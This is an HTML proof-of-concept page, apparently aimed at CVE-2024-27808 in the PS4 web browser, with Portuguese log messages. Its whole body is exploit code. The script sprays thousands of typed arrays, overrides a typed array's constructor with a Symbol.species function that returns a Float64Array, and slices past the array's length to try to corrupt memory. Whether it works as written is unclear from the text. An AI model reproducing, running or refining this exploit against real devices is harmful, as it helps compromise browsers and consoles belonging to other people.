<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - CVE-2024-27808 - Ultra Refined PS4 Test</title>
</head>
<body>
<h1>PoC - CVE-2024-27808 - PS4 Advanced Test</h1>

<script>
try {
    console.log("[+] Iniciando spray de objetos...");

    let victims = [];
    for (let i = 0; i < 10000; i++) {
        victims.push(new Uint32Array(10));
    }

    console.log("[+] Preparando objeto fake...");

    let evil_array = new Uint32Array(1);
    evil_array.constructor = {
        [Symbol.species]: function() {
            return new Float64Array(1);
        }
    };

    console.log("[+] Executando slice para provocar corrupção...");

    let corrupted = evil_array.slice(0, 4); // slice com overflow pequeno

    console.log("[!] Resultado da corrupção:");
    console.log(corrupted);

} catch (e) {
    console.error("[OK] Exceção capturada:", e);
}
</script>

</body>
</html>
